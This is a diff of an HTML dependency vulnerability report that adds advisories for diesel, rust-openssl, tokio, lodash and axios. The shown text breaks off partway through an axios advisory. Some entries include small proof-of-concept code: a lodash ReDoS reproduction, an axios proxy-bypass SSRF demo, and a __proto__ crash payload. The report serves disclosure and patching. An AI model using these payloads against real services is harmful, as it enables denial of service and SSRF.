@@ -361,28 +361,28 @@
 			<header>
 				<h1>🛡️ Vulnerability Report</h1>
 				<div class="scan-info">
-					<div>📅 Scan Date: 2026-04-29 13:59:03</div>
-					<div>📦 Total Dependencies: 11</div>
-					<div>🔍 Vulnerabilities Found: 0</div>
+					<div>📅 Scan Date: 2026-05-03 14:25:14</div>
+					<div>📦 Total Dependencies: 37</div>
+					<div>🔍 Vulnerabilities Found: 93</div>
 				</div>
 			</header>
 
 			<div class="stats">
 				<div class="stat-card critical" onclick="toggleFilter(this)" data-level="CRITICAL">
 					<h3>Critical</h3>
-					<div class="number">0</div>
+					<div class="number">25</div>
 				</div>
 				<div class="stat-card high" onclick="toggleFilter(this)" data-level="HIGH">
 					<h3>High</h3>
-					<div class="number">0</div>
+					<div class="number">8</div>
 				</div>
 				<div class="stat-card medium" onclick="toggleFilter(this)" data-level="MEDIUM">
 					<h3>Medium</h3>
-					<div class="number">0</div>
+					<div class="number">28</div>
 				</div>
 				<div class="stat-card low" onclick="toggleFilter(this)" data-level="LOW">
 					<h3>Low</h3>
-					<div class="number">0</div>
+					<div class="number">32</div>
 				</div>
 			</div>
 
@@ -392,6 +392,3354 @@
 
 			<div class="vulnerabilities">
 				<h2>Vulnerability Details</h2>
+				
+				<div class="vuln-item critical" data-severity="CRITICAL" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">GHSA-wq9x-qwcq-mmgf</div>
+						<div class="severity-badge critical">
+							🔴
+							
+							
+							
+							CRITICAL
+							
+								(CVSS: 9.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> diesel
+					</div>
+					<div class="vuln-description">
+						Diesel vulnerable to Binary Protocol Misinterpretation caused by Truncating or Overflowing Casts. The following presentation at this year&#39;s DEF CON was brought to our attention on the Diesel Gitter Channel:
+
+&gt; SQL Injection isn&#39;t Dead: Smuggling Queries at the Protocol Level  
+&gt; &lt;http://web.archive.org/web/20240812130923/https://media.defcon.org/DEF%20CON%2032/DEF%20CON%2032%20presentations/DEF%20CON%2032%20-%20Paul%20Gerste%20-%20SQL%20Injection%20Isn&#39;t%20Dead%20Smuggling%20Queries%20at%20the%20Protocol%20Level.pdf&gt;  
+&gt; (Archive link for posterity.)
+Essentially, encoding a value larger than 4GiB can cause the length prefix in the protocol to overflow, 
+causing the server to interpret the rest of the string as binary protocol commands or other data.
+
+It appears Diesel _does_ perform truncating casts in a way that could be problematic, 
+for example: &lt;https://github.com/diesel-rs/diesel/blob/ae82c4a5a133db65612b7436356f549bfecda1c7/diesel/src/pg/connection/stmt/mod.rs#L36&gt;
+
+This code has existed essentially since the beginning, 
+so it is reasonable to assume that all published versions `&lt;= 2.2.2` are affected.
+
+## Mitigation
+
+The prefered migration to the outlined problem is to update to a Diesel version newer than 2.2.2, which includes 
+fixes for the problem. 
+
+As always, you should make sure your application is validating untrustworthy user input. 
+Reject any input over 4 GiB, or any input that could _encode_ to a string longer than 4 GiB. 
+Dynamically built queries are also potentially problematic if it pushes the message size over this 4 GiB bound.
+
+For web application backends, consider adding some middleware that limits the size of request bodies by default.
+
+## Resolution
+
+Diesel now uses `#[deny]` directives for the following Clippy lints:
+
+* [`cast_possible_truncation`](https://rust-lang.github.io/rust-clippy/master/#/cast_possible_truncation)
+* [`cast_possible_wrap`](https://rust-lang.github.io/rust-clippy/master/#/cast_possible_wrap)
+* [`cast_sign_loss`](https://rust-lang.github.io/rust-clippy/master/#/cast_sign_loss)
+
+to prevent casts that will lead to precision loss or other trunctations. Additionally we performed an 
+audit of the relevant code.
+
+A fix is included in the `2.2.3` release.
+
+					</div>
+				</div>
+				
+				<div class="vuln-item medium" data-severity="MEDIUM" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">GHSA-3gxf-9r58-2ghg</div>
+						<div class="severity-badge medium">
+							
+							
+							🟡
+							
+							MEDIUM
+							
+								(CVSS: 5.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> openssl
+					</div>
+					<div class="vuln-description">
+						`openssl` `X509NameBuilder::build` returned object is not thread safe. OpenSSL has a `modified` bit that it can set on on `X509_NAME` objects. If this bit is set then the object is not thread-safe even when it appears the code is not modifying the value.
+
+Thanks to David Benjamin (Google) for reporting this issue.
+
+					</div>
+				</div>
+				
+				<div class="vuln-item high" data-severity="HIGH" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">GHSA-6hcf-g6gr-hhcr</div>
+						<div class="severity-badge high">
+							
+							🟠
+							
+							
+							HIGH
+							
+								(CVSS: 7.5)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> openssl
+					</div>
+					<div class="vuln-description">
+						`openssl` `X509Extension::new` and `X509Extension::new_nid` null pointer dereference. These functions would crash when the context argument was None with certain extension types.
+
+Thanks to David Benjamin (Google) for reporting this issue.
+
+					</div>
+				</div>
+				
+				<div class="vuln-item high" data-severity="HIGH" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2026-41678</div>
+						<div class="severity-badge high">
+							
+							🟠
+							
+							
+							HIGH
+							
+								(CVSS: 7.5)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> openssl
+					</div>
+					<div class="vuln-description">
+						rust-openssl has incorrect bounds assertion in aes key wrap. ### Summary
+``aes::unwrap_key()`` has an incorrect bounds assertion on the out buffer size, which can lead to out-of-bounds write.
+
+### Details
+``aes::unwrap_key()`` contains an incorrect assertion: it checks that `out.len() + 8 &lt;= in_.len()`, but this condition is reversed. The intended invariant is `out.len() &gt;= in_.len() - 8`, ensuring the output buffer is large enough.
+
+Because of the inverted check, the function only accepts buffers at or below the minimum required size and rejects larger ones. If a smaller buffer is provided the function will write past the end of `out` by `in_.len() - 8 - out.len()` bytes, causing an out-of-bounds write from a safe public function.
+
+### Impact
+Vulnerable applications using AES keywrap and allowing attacker controlled buffer sizes could have an attacker trigger an out-of-bounds write.
+					</div>
+				</div>
+				
+				<div class="vuln-item high" data-severity="HIGH" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">GHSA-9qwg-crg9-m2vc</div>
+						<div class="severity-badge high">
+							
+							🟠
+							
+							
+							HIGH
+							
+								(CVSS: 7.5)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> openssl
+					</div>
+					<div class="vuln-description">
+						`openssl` `SubjectAlternativeName` and `ExtendedKeyUsage::other` allow arbitrary file read. `SubjectAlternativeName` and `ExtendedKeyUsage` arguments were parsed using the OpenSSL function `X509V3_EXT_nconf`. This function parses all input using an OpenSSL mini-language which can perform arbitrary file reads.
+
+Thanks to David Benjamin (Google) for reporting this issue.
+
+					</div>
+				</div>
+				
+				<div class="vuln-item high" data-severity="HIGH" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">GHSA-hppc-g8h3-xhp3</div>
+						<div class="severity-badge high">
+							
+							🟠
+							
+							
+							HIGH
+							
+								(CVSS: 7.5)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> openssl
+					</div>
+					<div class="vuln-description">
+						rust-openssl: Unchecked callback length in PSK/cookie trampolines leaks adjacent memory to peer. The FFI trampolines behind `SslContextBuilder::set_psk_client_callback`, `set_psk_server_callback`, `set_cookie_generate_cb`,  and `set_stateless_cookie_generate_cb` forwarded the user closure&#39;s returned usize directly to OpenSSL without checking it against the `&amp;mut [u8]` that was handed to the closure. This can lead to buffer overflows and other unintended consequences.
+					</div>
+				</div>
+				
+				<div class="vuln-item high" data-severity="HIGH" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2026-41676</div>
+						<div class="severity-badge high">
+							
+							🟠
+							
+							
+							HIGH
+							
+								(CVSS: 7.5)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> openssl
+					</div>
+					<div class="vuln-description">
+						rust-openssl: Deriver::derive and PkeyCtxRef::derive can overflow short buffers on OpenSSL 1.1.1. `Deriver::derive` (and `PkeyCtxRef::derive`) sets `len = buf.len()` and passes it as the in/out length to `EVP_PKEY_derive`, relying on OpenSSL to honor it. On OpenSSL 1.1.x, X25519, X448, DH and HKDF-extract  ignore the incoming `*keylen`, unconditionally writing the full shared secret (32/56/prime-size bytes). A caller passing a short slice gets a heap/stack overflow from safe code. OpenSSL 3.x providers do check, so this only impacts older OpenSSL.
+					</div>
+				</div>
+				
+				<div class="vuln-item low" data-severity="LOW" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">GHSA-q445-7m23-qrmw</div>
+						<div class="severity-badge low">
+							
+							
+							
+							🟢
+							LOW
+							
+								(CVSS: 3.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> openssl
+					</div>
+					<div class="vuln-description">
+						openssl&#39;s `MemBio::get_buf` has undefined behavior with empty buffers. Previously, `MemBio::get_buf` called `slice::from_raw_parts` with a null-pointer, which violates the functions invariants, leading to undefined behavior. In debug builds this would produce an assertion failure. This is now fixed.
+
+					</div>
+				</div>
+				
+				<div class="vuln-item medium" data-severity="MEDIUM" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2025-24898</div>
+						<div class="severity-badge medium">
+							
+							
+							🟡
+							
+							MEDIUM
+							
+								(CVSS: 5.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> openssl
+					</div>
+					<div class="vuln-description">
+						rust-openssl ssl::select_next_proto use after free. ### Impact
+`ssl::select_next_proto` can return a slice pointing into the `server` argument&#39;s buffer but with a lifetime bound to the `client` argument. In situations where the `server` buffer&#39;s lifetime is shorter than the `client` buffer&#39;s, this can cause a use after free. This could cause the server to crash or to return arbitrary memory contents to the client.
+
+### Patches
+`openssl` 0.10.70 fixes the signature of `ssl::select_next_proto` to properly constrain the output buffer&#39;s lifetime to that of both input buffers.
+
+### Workarounds
+In standard usage of `ssl::select_next_proto` in the callback passed to `SslContextBuilder::set_alpn_select_callback`, code is only affected if the `server` buffer is constructed *within* the callback. For example:
+
+Not vulnerable - the server buffer has a `&#39;static` lifetime:
+```rust
+builder.set_alpn_select_callback(|_, client_protos| {
+    ssl::select_next_proto(b&#34;\x02h2&#34;, client_protos).ok_or_else(AlpnError::NOACK)
+});
+```
+
+Not vulnerable - the server buffer outlives the handshake:
+```rust
+let server_protos = b&#34;\x02h2&#34;.to_vec();
+builder.set_alpn_select_callback(|_, client_protos| {
+    ssl::select_next_proto(&amp;server_protos, client_protos).ok_or_else(AlpnError::NOACK)
+});
+```
+
+Vulnerable - the server buffer is freed when the callback returns:
+```rust
+builder.set_alpn_select_callback(|_, client_protos| {
+    let server_protos = b&#34;\x02h2&#34;.to_vec();
+    ssl::select_next_proto(&amp;server_protos, client_protos).ok_or_else(AlpnError::NOACK)
+});
+```
+
+### References
+https://github.com/sfackler/rust-openssl/pull/2360
+					</div>
+				</div>
+				
+				<div class="vuln-item medium" data-severity="MEDIUM" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2023-53159</div>
+						<div class="severity-badge medium">
+							
+							
+							🟡
+							
+							MEDIUM
+							
+								(CVSS: 4.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> openssl
+					</div>
+					<div class="vuln-description">
+						`openssl` `X509VerifyParamRef::set_host` buffer over-read. When this function was passed an empty string, `openssl` would attempt to call `strlen` on it, reading arbitrary memory until it reached a NUL byte.
+					</div>
+				</div>
+				
+				<div class="vuln-item low" data-severity="LOW" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2026-41677</div>
+						<div class="severity-badge low">
+							
+							
+							
+							🟢
+							LOW
+							
+								(CVSS: 2.5)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> openssl
+					</div>
+					<div class="vuln-description">
+						rust-opennssl has an Out-of-bounds read in PEM password callback when returning an oversized length. The `*_from_pem_callback` APIs did not validate the length returned by the user&#39;s callback. A password callback that returns a value larger than the buffer it was given can cause some versions of OpenSSL to over-read this buffer. OpenSSL 3.x is not affected by this.
+					</div>
+				</div>
+				
+				<div class="vuln-item medium" data-severity="MEDIUM" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">GHSA-xphf-cx8h-7q9g</div>
+						<div class="severity-badge medium">
+							
+							
+							🟡
+							
+							MEDIUM
+							
+								(CVSS: 5.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> openssl
+					</div>
+					<div class="vuln-description">
+						`openssl` `X509StoreRef::objects` is unsound. This function returned a reference into an OpenSSL datastructure, but there was no way to ensure OpenSSL would not mutate the datastructure behind one&#39;s back.
+
+Use of this function should be replaced with `X509StoreRef::all_certificates`.
+
+					</div>
+				</div>
+				
+				<div class="vuln-item low" data-severity="LOW" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">GHSA-4q83-7cq4-p6wg</div>
+						<div class="severity-badge low">
+							
+							
+							
+							🟢
+							LOW
+							
+								(CVSS: 2.5)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> tokio
+					</div>
+					<div class="vuln-description">
+						`tokio::io::ReadHalf&lt;T&gt;::unsplit` is Unsound. `tokio::io::ReadHalf&lt;T&gt;::unsplit` can violate the `Pin` contract
+
+The soundness issue is described in the [tokio/issues#5372](https://github.com/tokio-rs/tokio/issues/5372)
+
+Specific set of conditions needed to trigger an issue (a !Unpin type in ReadHalf)
+is unusual, combined with the difficulty of making any arbitrary use-after-free
+exploitable in Rust without doing a lot of careful alignment of data types in
+the surrounding code.
+
+The `tokio` feature `io-util` is also required to be enabled to trigger this
+soundness issue.
+
+Thanks to zachs18 reporting the issue to Tokio team responsibly and taiki-e
+and carllerche appropriately responding and fixing the soundness bug.
+
+Tokio before 0.2.0 used `futures` 0.1 that did not have `Pin`, so it is not
+affected by this issue.
+
+					</div>
+				</div>
+				
+				<div class="vuln-item low" data-severity="LOW" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2023-22466</div>
+						<div class="severity-badge low">
+							
+							
+							
+							🟢
+							LOW
+							
+								(CVSS: 2.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> tokio
+					</div>
+					<div class="vuln-description">
+						Tokio reject_remote_clients configuration may get dropped when creating a Windows named pipe. ### Impact
+
+When configuring a Windows named pipe server, setting `pipe_mode` will reset `reject_remote_clients` to `false`. If the application has previously configured `reject_remote_clients` to `true`, this effectively undoes the configuration. This also applies if `reject_remote_clients` is not explicitly set as this is the default configuration and is cleared by calling `pipe_mode`.
+
+Remote clients may only access the named pipe if the named pipe&#39;s associated path is accessible via a publically shared folder (SMB).
+
+### Patches
+
+The following versions have been patched:
+* 1.23.1
+* 1.20.3
+* 1.18.4
+
+The fix will also be present in all releases starting from version 1.24.0.
+
+Named pipes were introduced to Tokio in version 1.7.0, so releases older than 1.7.0 are not affected.
+
+### Workarounds
+
+Ensure that `pipe_mode` is set **first** after initializing a `ServerOptions`. For example:
+
+```rust
+let mut opts = ServerOptions::new();
+opts.pipe_mode(PipeMode::Message);
+opts.reject_remote_clients(true);
+```
+
+### References
+
+https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea#pipe_reject_remote_clients
+
+					</div>
+				</div>
+				
+				<div class="vuln-item low" data-severity="LOW" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">GHSA-rr8g-9fpq-6wmg</div>
+						<div class="severity-badge low">
+							
+							
+							
+							🟢
+							LOW
+							
+								(CVSS: 2.5)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> tokio
+					</div>
+					<div class="vuln-description">
+						Tokio broadcast channel calls clone in parallel, but does not require `Sync`. The broadcast channel internally calls `clone` on the stored value when receiving it, and only requires `T:Send`. This means that using the broadcast channel with values that are `Send` but not `Sync` can trigger unsoundness if the `clone` implementation makes use of the value being `!Sync`.
+
+Thank you to Austin Bonander for finding and reporting this issue.
+					</div>
+				</div>
+				
+				<div class="vuln-item low" data-severity="LOW" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2020-28500</div>
+						<div class="severity-badge low">
+							
+							
+							
+							🟢
+							LOW
+							
+								(CVSS: 2.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> lodash
+					</div>
+					<div class="vuln-description">
+						Regular Expression Denial of Service (ReDoS) in lodash. All versions of package lodash prior to 4.17.21 are vulnerable to Regular Expression Denial of Service (ReDoS) via the `toNumber`, `trim` and `trimEnd` functions. 
+
+Steps to reproduce (provided by reporter Liyuan Chen):
+```js
+var lo = require(&#39;lodash&#39;);
+
+function build_blank(n) {
+    var ret = &#34;1&#34;
+    for (var i = 0; i &lt; n; i++) {
+        ret += &#34; &#34;
+    }
+    return ret + &#34;1&#34;;
+}
+var s = build_blank(50000) var time0 = Date.now();
+lo.trim(s) 
+var time_cost0 = Date.now() - time0;
+console.log(&#34;time_cost0: &#34; + time_cost0);
+var time1 = Date.now();
+lo.toNumber(s) var time_cost1 = Date.now() - time1;
+console.log(&#34;time_cost1: &#34; + time_cost1);
+var time2 = Date.now();
+lo.trimEnd(s);
+var time_cost2 = Date.now() - time2;
+console.log(&#34;time_cost2: &#34; + time_cost2);
+```
+					</div>
+				</div>
+				
+				<div class="vuln-item critical" data-severity="CRITICAL" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2021-23337</div>
+						<div class="severity-badge critical">
+							🔴
+							
+							
+							
+							CRITICAL
+							
+								(CVSS: 9.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> lodash
+					</div>
+					<div class="vuln-description">
+						Command Injection in lodash. `lodash` versions prior to 4.17.21 are vulnerable to Command Injection via the template function.
+					</div>
+				</div>
+				
+				<div class="vuln-item low" data-severity="LOW" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2026-2950</div>
+						<div class="severity-badge low">
+							
+							
+							
+							🟢
+							LOW
+							
+								(CVSS: 3.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> lodash
+					</div>
+					<div class="vuln-description">
+						lodash vulnerable to Prototype Pollution via array path bypass in `_.unset` and `_.omit`. ### Impact
+
+Lodash versions 4.17.23 and earlier are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. The fix for [CVE-2025-13465](https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg) only guards against string key members, so an attacker can bypass the check by passing array-wrapped path segments. This allows deletion of properties from built-in prototypes such as `Object.prototype`, `Number.prototype`, and `String.prototype`.
+
+The issue permits deletion of prototype properties but does not allow overwriting their original behavior.
+
+### Patches
+
+This issue is patched in 4.18.0.
+
+### Workarounds
+
+None. Upgrade to the patched version.
+					</div>
+				</div>
+				
+				<div class="vuln-item critical" data-severity="CRITICAL" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2026-4800</div>
+						<div class="severity-badge critical">
+							🔴
+							
+							
+							
+							CRITICAL
+							
+								(CVSS: 9.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> lodash
+					</div>
+					<div class="vuln-description">
+						lodash vulnerable to Code Injection via `_.template` imports key names. ### Impact
+
+The fix for [CVE-2021-23337](https://github.com/advisories/GHSA-35jh-r3h4-6jhm) added validation for the `variable` option in `_.template` but did not apply the same validation to `options.imports` key names. Both paths flow into the same `Function()` constructor sink.
+
+When an application passes untrusted input as `options.imports` key names, an attacker can inject default-parameter expressions that execute arbitrary code at template compilation time.
+
+Additionally, `_.template` uses `assignInWith` to merge imports, which enumerates inherited properties via `for..in`. If `Object.prototype` has been polluted by any other vector, the polluted keys are copied into the imports object and passed to `Function()`.
+
+### Patches
+
+Users should upgrade to version 4.18.0.
+
+The fix applies two changes:
+1. Validate `importsKeys` against the existing `reForbiddenIdentifierChars` regex (same check already used for the `variable` option)
+2. Replace `assignInWith` with `assignWith` when merging imports, so only own properties are enumerated
+
+### Workarounds
+
+Do not pass untrusted input as key names in `options.imports`. Only use developer-controlled, static key names.
+					</div>
+				</div>
+				
+				<div class="vuln-item low" data-severity="LOW" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2025-13465</div>
+						<div class="severity-badge low">
+							
+							
+							
+							🟢
+							LOW
+							
+								(CVSS: 3.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> lodash
+					</div>
+					<div class="vuln-description">
+						Lodash has Prototype Pollution Vulnerability in `_.unset` and `_.omit` functions. ### Impact
+
+Lodash versions 4.0.0 through 4.17.22 are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. An attacker can pass crafted paths which cause Lodash to delete methods from global prototypes. 
+
+The issue permits deletion of properties but does not allow overwriting their original behavior.  
+
+### Patches
+
+This issue is patched on 4.17.23.
+					</div>
+				</div>
+				
+				<div class="vuln-item medium" data-severity="MEDIUM" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2025-62718</div>
+						<div class="severity-badge medium">
+							
+							
+							🟡
+							
+							MEDIUM
+							
+								(CVSS: 4.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> axios
+					</div>
+					<div class="vuln-description">
+						Axios has a NO_PROXY Hostname Normalization Bypass that Leads to SSRF. Axios does not correctly handle hostname normalization when checking `NO_PROXY` rules.
+Requests to loopback addresses like `localhost.` (with a trailing dot) or `[::1]` (IPv6 literal) skip `NO_PROXY` matching and go through the configured proxy.
+
+This goes against what developers expect and lets attackers force requests through a proxy, even if `NO_PROXY` is set up to protect loopback or internal services.
+
+According to [RFC 1034 §3.1](https://datatracker.ietf.org/doc/html/rfc1034#section-3.1) and [RFC 3986 §3.2.2](https://datatracker.ietf.org/doc/html/rfc3986#section-3.2.2), a hostname can have a trailing dot to show it is a fully qualified domain name (FQDN). At the DNS level, `localhost.` is the same as `localhost`. 
+However, Axios does a literal string comparison instead of normalizing hostnames before checking `NO_PROXY`. This causes requests like `http://localhost.:8080/` and `http://[::1]:8080/` to be incorrectly proxied.
+
+This issue leads to the possibility of proxy bypass and SSRF vulnerabilities allowing attackers to reach sensitive loopback or internal services despite the configured protections.
+
+---
+
+**PoC**
+
+```js
+import http from &#34;http&#34;;
+import axios from &#34;axios&#34;;
+
+const proxyPort = 5300;
+
+http.createServer((req, res) =&gt; {
+  console.log(&#34;[PROXY] Got:&#34;, req.method, req.url, &#34;Host:&#34;, req.headers.host);
+  res.writeHead(200, { &#34;Content-Type&#34;: &#34;text/plain&#34; });
+  res.end(&#34;proxied&#34;);
+}).listen(proxyPort, () =&gt; console.log(&#34;Proxy&#34;, proxyPort));
+
+process.env.HTTP_PROXY = `http://127.0.0.1:${proxyPort}`;
+process.env.NO_PROXY = &#34;localhost,127.0.0.1,::1&#34;;
+
+async function test(url) {
+  try {
+    await axios.get(url, { timeout: 2000 });
+  } catch {}
+}
+
+setTimeout(async () =&gt; {
+  console.log(&#34;\n[*] Testing http://localhost.:8080/&#34;);
+  await test(&#34;http://localhost.:8080/&#34;); // goes through proxy
+
+  console.log(&#34;\n[*] Testing http://[::1]:8080/&#34;);
+  await test(&#34;http://[::1]:8080/&#34;); // goes through proxy
+}, 500);
+```
+
+**Expected:** Requests bypass the proxy (direct to loopback).
+**Actual:** Proxy logs requests for `localhost.` and `[::1]`.
+
+---
+
+**Impact**
+
+* Applications that rely on `NO_PROXY=localhost,127.0.0.1,::1` for protecting loopback/internal access are vulnerable.
+* Attackers controlling request URLs can:
+
+  * Force Axios to send local traffic through an attacker-controlled proxy.
+  * Bypass SSRF mitigations relying on NO\_PROXY rules.
+  * Potentially exfiltrate sensitive responses from internal services via the proxy.
+  
+  
+---
+
+**Affected Versions**
+
+* Confirmed on Axios **1.12.2** (latest at time of testing).
+* affects all versions that rely on Axios’ current `NO_PROXY` evaluation.
+
+---
+
+**Remediation**
+Axios should normalize hostnames before evaluating `NO_PROXY`, including:
+
+* Strip trailing dots from hostnames (per RFC 3986).
+* Normalize IPv6 literals by removing brackets for matching.
+					</div>
+				</div>
+				
+				<div class="vuln-item medium" data-severity="MEDIUM" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2026-25639</div>
+						<div class="severity-badge medium">
+							
+							
+							🟡
+							
+							MEDIUM
+							
+								(CVSS: 4.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> axios
+					</div>
+					<div class="vuln-description">
+						Axios is Vulnerable to Denial of Service via __proto__ Key in mergeConfig. # Denial of Service via **proto** Key in mergeConfig
+
+### Summary
+
+The `mergeConfig` function in axios crashes with a TypeError when processing configuration objects containing `__proto__` as an own property. An attacker can trigger this by providing a malicious configuration object created via `JSON.parse()`, causing complete denial of service.
+
+### Details
+
+The vulnerability exists in `lib/core/mergeConfig.js` at lines 98-101:
+
+```javascript
+utils.forEach(Object.keys({ ...config1, ...config2 }), function computeConfigValue(prop) {
+  const merge = mergeMap[prop] || mergeDeepProperties;
+  const configValue = merge(config1[prop], config2[prop], prop);
+  (utils.isUndefined(configValue) &amp;&amp; merge !== mergeDirectKeys) || (config[prop] = configValue);
+});
+```
+
+When `prop` is `&#39;__proto__&#39;`:
+
+1. `JSON.parse(&#39;{&#34;__proto__&#34;: {...}}&#39;)` creates an object with `__proto__` as an own enumerable property
+2. `Object.keys()` includes `&#39;__proto__&#39;` in the iteration
+3. `mergeMap[&#39;__proto__&#39;]` performs prototype chain lookup, returning `Object.prototype` (truthy object)
+4. The expression `mergeMap[prop] || mergeDeepProperties` evaluates to `Object.prototype`
+5. `Object.prototype(...)` throws `TypeError: merge is not a function`
+
+The `mergeConfig` function is called by:
+
+- `Axios._request()` at `lib/core/Axios.js:75`
+- `Axios.getUri()` at `lib/core/Axios.js:201`
+- All HTTP method shortcuts (`get`, `post`, etc.) at `lib/core/Axios.js:211,224`
+
+### PoC
+
+```javascript
+import axios from &#34;axios&#34;;
+
+const maliciousConfig = JSON.parse(&#39;{&#34;__proto__&#34;: {&#34;x&#34;: 1}}&#39;);
+await axios.get(&#34;https://httpbin.org/get&#34;, maliciousConfig);
+```
+
+**Reproduction steps:**
+
+1. Clone axios repository or `npm install axios`
+2. Create file `poc.mjs` with the code above
+3. Run: `node poc.mjs`
+4. Observe the TypeError crash
+
+**Verified output (axios 1.13.4):**
+
+```
+TypeError: merge is not a function
+    at computeConfigValue (lib/core/mergeConfig.js:100:25)
+    at Object.forEach (lib/utils.js:280:10)
+    at mergeConfig (lib/core/mergeConfig.js:98:9)
+```
+
+**Control tests performed:**
+| Test | Config | Result |
+|------|--------|--------|
+| Normal config | `{&#34;timeout&#34;: 5000}` | SUCCESS |
+| Malicious config | `JSON.parse(&#39;{&#34;__proto__&#34;: {&#34;x&#34;: 1}}&#39;)` | **CRASH** |
+| Nested object | `{&#34;headers&#34;: {&#34;X-Test&#34;: &#34;value&#34;}}` | SUCCESS |
+
+**Attack scenario:**
+An application that accepts user input, parses it with `JSON.parse()`, and passes it to axios configuration will crash when receiving the payload `{&#34;__proto__&#34;: {&#34;x&#34;: 1}}`.
+
+### Impact
+
+**Denial of Service** - Any application using axios that processes user-controlled JSON and passes it to axios configuration methods is vulnerable. The application will crash when processing the malicious payload.
+
+Affected environments:
+
+- Node.js servers using axios for HTTP requests
+- Any backend that passes parsed JSON to axios configuration
+
+This is NOT prototype pollution - the application crashes before any assignment occurs.
+					</div>
+				</div>
+				
+				<div class="vuln-item medium" data-severity="MEDIUM" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2021-3749</div>
+						<div class="severity-badge medium">
+							
+							
+							🟡
+							
+							MEDIUM
+							
+								(CVSS: 4.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> axios
+					</div>
+					<div class="vuln-description">
+						axios Inefficient Regular Expression Complexity vulnerability. axios before v0.21.2 is vulnerable to Inefficient Regular Expression Complexity.
+					</div>
+				</div>
+				
+				<div class="vuln-item medium" data-severity="MEDIUM" onclick="toggleCard(this)">
+					<div class="vuln-header">
+						<div class="vuln-id">CVE-2026-40175</div>
+						<div class="severity-badge medium">
+							
+							
+							🟡
+							
+							MEDIUM
+							
+								(CVSS: 4.0)
+							
+						</div>
+					</div>
+					<div class="vuln-detail">
+						<strong>Affected Package:</strong> axios
+					</div>
+					<div class="vuln-description">
+						Axios has Unrestricted Cloud Metadata Exfiltration via Header Injection Chain. # Vulnerability Disclosure: Unrestricted Cloud Metadata Exfiltration via Header Injection Chain
+
+## Summary
+The Axios library is vulnerable to a specific &#34;Gadget&#34; attack chain that allows **Prototype Pollution** in any third-party dependency to be escalated into **Remote Code Execution (RCE)** or **Full Cloud Compromise** (via AWS IMDSv2 bypass).
+
+While Axios patches exist for *preventing check* pollution, the library remains vulnerable to *being used* as a gadget when pollution occurs elsewhere. This is due to a lack of HTTP Header Sanitization (CWE-113) combined with default SSRF capabilities.
+
+**Severity**: Critical (CVSS 9.9)
+**Affected Versions**: All versions (v0.x - v1.x)
+**Vulnerable Component**: `lib/adapters/http.js` (Header Processing)
+
+## Usage of &#34;Helper&#34; Vulnerabilities
